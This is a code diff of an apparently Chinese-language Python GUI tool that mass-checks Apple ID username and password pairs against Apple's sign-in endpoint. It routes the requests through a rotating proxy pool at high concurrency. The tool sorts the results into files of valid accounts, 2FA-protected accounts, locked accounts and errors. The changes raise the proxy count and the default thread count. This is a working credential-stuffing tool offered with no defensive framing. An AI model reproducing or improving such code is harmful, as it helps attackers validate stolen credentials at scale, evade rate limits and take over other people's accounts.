@@ -58,13 +58,13 @@ class Statistics:
         async with self.lock:
             if key in self.data:
                 self.data[key] += value
+                self.processed_accounts += 1
             # logger.info(f"Updated {key}: {self.data[key]}")
 
     async def increment_processed_accounts(self):
         async with self.lock:
             # self.processed_accounts += 1
             self.processed_accounts = self.data["correct"] + self.data["2fa"] + self.data["locked"] + self.data["error"]
-            # self.data["total"] = self.processed_accounts
 
     async def get_stats(self):
         async with self.lock:
@@ -85,7 +85,7 @@ logger.info(f"创建结果文件夹: {folder_name}")
 async def update_gui(window, stats):
     global is_running
     while True:
-        await asyncio.sleep(0.5)    # 每隔0.5秒更新一次
+        await asyncio.sleep(2)    # 每隔0.5秒更新一次
         if is_running:
             try:
                 current_stats, processed_accounts = await stats.get_stats()
@@ -155,16 +155,28 @@ def run_async(coroutine, window):
     threading.Thread(target=thread_func, daemon=True).start()
 
 
+def run_async_gui(coroutine, window):
+    """
+    在单独的线程中运行异步任务，并在完成时通知GUI。
+    """
+    def thread_func():
+        try:
+            new_loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(new_loop)
+            asyncio.run_coroutine_threadsafe(coroutine, new_loop)
+            # future.add_done_callback(lambda f: window.write_event_value('-TASK_COMPLETED-', None))
+            new_loop.run_forever()
+        except Exception as e:
+            logger.error(f"Error in thread_func: {e}")
+
+    threading.Thread(target=thread_func, daemon=True).start()
+
+
 # 启动 GUI 更新线程
-run_async(update_gui(window, stats), window)
+run_async_gui(update_gui(window, stats), window)
 
 
 # 创建文件写入函数
-def write_to_processed_file(apple_id, password):
-    with open(f'results/{folder_name}/已处理.txt', 'a') as file:
-        file.write(f"{apple_id}----{password}\n")
-
-
 def write_to_correct_file(apple_id, password):
     with open(f'results/{folder_name}/密正.txt', 'a') as file:
         file.write(f"{apple_id}----{password}\n")
@@ -174,6 +186,15 @@ def write_to_two_factor_file(apple_id, password):
     with open(f'results/{folder_name}/双重.txt', 'a') as file:
         file.write(f"{apple_id}----{password}\n")
 
+
+def write_to_locked_file(apple_id, password):
+    with open(f'results/{folder_name}/被锁.txt', 'a') as file:
+        file.write(f"{apple_id}----{password}\n")
+
+
+def write_to_error_file(apple_id, password):
+    with open(f'results/{folder_name}/错误.txt', 'a') as file:
+        file.write(f"{apple_id}----{password}\n")
 
 # 代理IP池
 class ProxyPool:
@@ -266,7 +287,6 @@ stop_event = asyncio.Event()
 # Apple ID 检测器, 使用代理池和帐号密码对池, 以及共享的统计数据
 class AsyncAppleIDChecker:
     def __init__(self, proxy_pool, account_pool, stats):
-        print("实例化AsyncAppleIDChecker类...")
         self.URL = 'https://idmsa.apple.com/appleauth/auth/signin'
         self.HEADERS = {
             "Accept": "application/json, text/javascript, */*; q=0.01",
@@ -320,54 +340,42 @@ class AsyncAppleIDChecker:
         # global stats
         try:
             response_json = json.loads(response_text)
-            write_to_processed_file(apple_id, password)
-        # except json.JSONDecodeError:
-        #     # If response is not JSON, it's an unknown error
-        #     logger.error(
-        #         f'Non-JSON response for AppleID -> {apple_id}:{password} | {response_text}')
-        #     await self.stats.update("error", 1)
-        #     await self.stats.increment_processed_accounts()
-        #     return {"status": "未知错误", "message": "返回内容格式异常，无法解析为JSON。"}
+
+            if response_json.get('authType') in ["non-sa", "restricted"]:
+                await self.stats.update("correct", 1)
+                logger.info(
+                    f'密码正确 NO 2FA AppleID -> {apple_id}:{password}')
+                write_to_correct_file(apple_id, password)
+                return {"status": "密码正确", "message": "帐号密码正确，无需双重认证。"}
+            elif response_json.get('authType') in ["sa", "hsa2", "hsa", "2sa", "2sa2"]:
+                await self.stats.update("2fa", 1)
+                logger.info(
+                    f'双重认证 2FA AppleID -> {apple_id}:{password}')
+                write_to_two_factor_file(apple_id, password)
+                return {"status": "双重认证", "message": "帐号密码正确，但开启了双重认证。"}
+            elif response_json["serviceErrors"][0].get("code") in ["-20209"]:
+                await self.stats.update("locked", 1)
+                # write_to_locked_file(apple_id, password)
+                logger.info(
+                    f'安全原因帐号被锁 AppleID -> {apple_id}:{password}')
+                return {"status": "帐号被锁", "message": "此Apple ID因安全原因已被锁定。"}
+            elif response_json["serviceErrors"][0].get("code") in ["-20101", "-20751"]:
+                await self.stats.update("error", 1)
+                # write_to_error_file(apple_id, password)
+                logger.info(
+                    f'密码错误 AppleID -> {apple_id}:{password}')
+                return {"status": "密码错误", "message": "帐号或密码错误。"}
+            else:
+                await self.stats.update("error", 1)
+                # write_to_error_file(apple_id, password)
+                logger.error(
+                    f'错误 AppleID -> {apple_id}:{password}|{response_text}')
+                return {"status": "未知错误", "message": "出现未知错误或其他异常情况。"}
         except Exception as e:
             logger.error(f"处理响应时发生未知错误：{e}")
             await self.stats.update("error", 1)
-            await self.stats.increment_processed_accounts()
+            # write_to_error_file(apple_id, password)
             return {"status": "未知错误", "message": "处理响应时发生未知错误。"}
-
-        if response_json.get('authType') in ["non-sa", "restricted"]:
-            logger.info(
-                f'密码正确 NO 2FA AppleID -> {apple_id}:{password}')
-            await self.stats.update("correct", 1)
-            await self.stats.increment_processed_accounts()
-            write_to_correct_file(apple_id, password)
-            return {"status": "密码正确", "message": "帐号密码正确，无需双重认证。"}
-        elif response_json.get('authType') in ["sa", "hsa2", "hsa", "2sa", "2sa2"]:
-            logger.info(
-                f'双重认证 2FA AppleID -> {apple_id}:{password}')
-            await self.stats.update("2fa", 1)
-            await self.stats.increment_processed_accounts()
-            write_to_two_factor_file(apple_id, password)
-            return {"status": "双重认证", "message": "帐号密码正确，但开启了双重认证。"}
-        elif "serviceErrors" in response_json:
-            for error in response_json["serviceErrors"]:
-                if error.get("code") == "-20101":
-                    logger.info(
-                        f'密码错误 AppleID -> {apple_id}:{password}')
-                    await self.stats.update("error", 1)
-                    await self.stats.increment_processed_accounts()
-                    return {"status": "密码错误", "message": "帐号或密码错误。"}
-                elif error.get("code") == "-20209":
-                    logger.info(
-                        f'安全原因帐号被锁 AppleID -> {apple_id}:{password}')
-                    await self.stats.update("locked", 1)
-                    await self.stats.increment_processed_accounts()
-                    return {"status": "帐号被锁", "message": "此Apple ID因安全原因已被锁定。"}
-        else:
-            logger.error(
-                f'错误 AppleID -> {apple_id}:{password}|{response_text}')
-            await self.stats.update("error", 1)
-            await self.stats.increment_processed_accounts()
-            return {"status": "未知错误", "message": "出现未知错误或其他异常情况。"}
 
     async def close(self):
         if self.session:
@@ -375,8 +383,7 @@ class AsyncAppleIDChecker:
 
 
 # 使用示例
-async def main(appleid_file_path, proxy_api_url, concurrency, NUM_PROXIES_TO_FETCH=1200):
-    logger.info("进入main函数，开始检测...")
+async def main(appleid_file_path, proxy_api_url, concurrency, NUM_PROXIES_TO_FETCH=2000):
     proxy_pool = ProxyPool(proxy_api_url, NUM_PROXIES_TO_FETCH)
     await proxy_pool.start()  # 异步启动代理池
     account_pool = AccountPool(stats)
@@ -419,7 +426,7 @@ while True:
         appleid_file_path = values["-APPLEIDFILE-"]
         proxy_api_url = values["-PROXYURL-"] if values["-PROXYURL-"] else DEFAULT_PROXY_API_URL
         concurrency_input = values["-THREAD-"]
-        concurrency = int(concurrency_input) if concurrency_input.isdigit() else 50
+        concurrency = int(concurrency_input) if concurrency_input.isdigit() else 100
         # if concurrency > 300:
         #     concurrency = 300
         logger.info(f"选择的文件路径是: {appleid_file_path}")
